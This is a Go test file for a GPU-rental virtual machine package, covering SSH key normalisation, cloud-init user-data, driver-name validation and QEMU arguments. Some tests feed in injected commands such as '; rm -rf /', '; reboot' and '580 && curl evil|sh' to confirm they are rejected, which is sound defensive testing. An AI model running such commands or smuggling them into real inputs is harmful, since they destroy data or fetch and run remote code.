package vmrt

import (
	"strings"
	"testing"
)

func TestNormalizePubkeyKeepsOnlyTypeAndKey(t *testing.T) {
	k, err := ThrowawayPubkey()
	if err != nil {
		t.Fatal(err)
	}
	got, err := NormalizePubkey(k + ` renter@laptop"; rm -rf /`)
	if err != nil || got != k {
		t.Fatalf("NormalizePubkey = %q, %v; want %q", got, err, k)
	}
	blob := strings.Fields(k)[1]
	for _, bad := range []string{
		"",
		"hello world",
		"ssh-ed25519 " + blob + "\nruncmd: [reboot]",
		"ssh-rsa " + blob, // type disagrees with the key data
		"ssh-ed25519 !!!notbase64",
	} {
		if _, err := NormalizePubkey(bad); err == nil {
			t.Errorf("accepted %q", bad)
		}
	}
}

func TestRentalUserDataHasNoPasswordAndNoCommands(t *testing.T) {
	k, _ := ThrowawayPubkey()
	ud, err := UserData("b8c78a70-9132-4b10-83c2-beb861a862ea", k, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"#cloud-config", "hostname: gpu-b8c78a70\n", "ssh_pwauth: false", "disable_root: false",
		"users: []\n", "ssh_authorized_keys:\n  - \"" + k + "\"\n", "PermitRootLogin prohibit-password", "PasswordAuthentication no"} {
		if !strings.Contains(ud, want) {
			t.Errorf("user-data missing %q:\n%s", want, ud)
		}
	}
	// No second account: the renter is root, and only with their key.
	if strings.Contains(ud, "- name:") || strings.Contains(ud, "default") {
		t.Errorf("a rental's user-data creates another user:\n%s", ud)
	}
	if strings.Contains(ud, "runcmd") || strings.Contains(ud, "chpasswd") || strings.Contains(ud, "\n    passwd:") || strings.Contains(ud, "plain_text_passwd") {
		t.Errorf("a rental's user-data runs commands or sets a password:\n%s", ud)
	}
}

func TestSelfTestUserDataProbes(t *testing.T) {
	k, _ := ThrowawayPubkey()
	ud, err := UserData("selftest", k, []string{"10.254.254.1:22", "192.168.1.1:80"})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"gpuagent-selftest", "BLOCKED", "192.168.1.1:80", "nvidia-smi"} {
		if !strings.Contains(ud, want) {
			t.Errorf("self-test user-data missing %q", want)
		}
	}
	if _, err := UserData("selftest", k, []string{"1.2.3.4:22; reboot"}); err == nil {
		t.Errorf("a probe target carrying a command was accepted")
	}
}

func TestHostnameIsGpuAndTheRentalIdsFirstEight(t *testing.T) {
	for id, want := range map[string]string{
		"b8c78a70-9132-4b10-83c2-beb861a862ea": "gpu-b8c78a70",
		"R1":                                   "gpu-r1",
		"abcdefg-hij":                          "gpu-abcdefg",
	} {
		if got := Hostname(id); got != want {
			t.Errorf("Hostname(%q) = %q, want %q", id, got, want)
		}
	}
	if md := MetaData("b8c78a70-9132"); !strings.Contains(md, "local-hostname: gpu-b8c78a70\n") {
		t.Errorf("meta-data hostname wrong:\n%s", md)
	}
}

func TestBakeUserData(t *testing.T) {
	ud, err := BakeUserData("580-server-open")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"nvidia-driver-580-server-open", "nvidia-utils-580-server", "cloud-init clean", "poweroff", "GPUAGENT-BAKE DONE"} {
		if !strings.Contains(ud, want) {
			t.Errorf("bake user-data missing %q", want)
		}
	}
	for d, ok := range map[string]bool{"580": true, "570-server": true, "580-server-open": true, "580; reboot": false, "latest": false, "": false} {
		if ValidDriver(d) != ok {
			t.Errorf("ValidDriver(%q) = %v, want %v", d, !ok, ok)
		}
	}
	if _, err := BakeUserData("580 && curl evil|sh"); err == nil {
		t.Errorf("an unsafe driver name was accepted")
	}
}

func TestNetworkConfigIsTheRentalSlashThirty(t *testing.T) {
	nc := NetworkConfig()
	for _, want := range []string{GuestMAC, GuestIP + "/30", "via: " + HostIP} {
		if !strings.Contains(nc, want) {
			t.Errorf("network-config missing %q:\n%s", want, nc)
		}
	}
}

func TestQEMUArgsOpenNoWayAroundTheFence(t *testing.T) {
	r := NewRental(dataDir, "R1")
	r.VFIO = []string{testGPU}
	args := strings.Join(QEMUArgs(testSpec(), r), " ")
	for _, want := range []string{"-nodefaults", "-sandbox on", "tap,id=net0,ifname=gpurent0t,script=no", "vfio-pci,host=" + testGPU, "q35,accel=kvm", "X-PciMmio64Mb", "-display none", "-monitor none"} {
		if !strings.Contains(args, want) {
			t.Errorf("QEMU args missing %q:\n%s", want, args)
		}
	}
	for _, bad := range []string{"user,", "hostfwd", "-daemonize", "vnc", "spice"} {
		if strings.Contains(args, bad) {
			t.Errorf("QEMU args contain %q:\n%s", bad, args)
		}
	}

	arm := testSpec()
	arm.Arch = "arm64"
	armArgs := strings.Join(QEMUArgs(arm, r), " ")
	if !strings.Contains(armArgs, "virt,accel=kvm,gic-version=host") || strings.Contains(armArgs, "X-PciMmio64Mb") {
		t.Errorf("arm64 args wrong:\n%s", armArgs)
	}
	launch := LaunchArgs(arm, r)
	if launch[0] != "--unit=gpu-rental-R1" || !strings.Contains(strings.Join(launch, " "), "qemu-system-aarch64") {
		t.Errorf("launch args = %v", launch)
	}
}

func TestGuestSizing(t *testing.T) {
	cases := []struct{ mem, cpus, wantMem, wantCPUs int }{
		{32768, 12, 28672, 10},       // a 32 GB, 12-thread box keeps 4 GB and 2 threads
		{128 * 1024, 20, 117965, 18}, // a DGX Spark keeps a tenth of its pool
		{6000, 4, 0, 3},              // too small to host
		{16384, 1, 12288, 1},
	}
	for _, c := range cases {
		s := Spec{TotalMemMB: c.mem, CPUs: c.cpus}
		if got := s.GuestMemoryMB(); got != c.wantMem {
			t.Errorf("GuestMemoryMB(%d) = %d, want %d", c.mem, got, c.wantMem)
		}
		if got := s.GuestCPUs(); got != c.wantCPUs {
			t.Errorf("GuestCPUs(%d) = %d, want %d", c.cpus, got, c.wantCPUs)
		}
	}
}
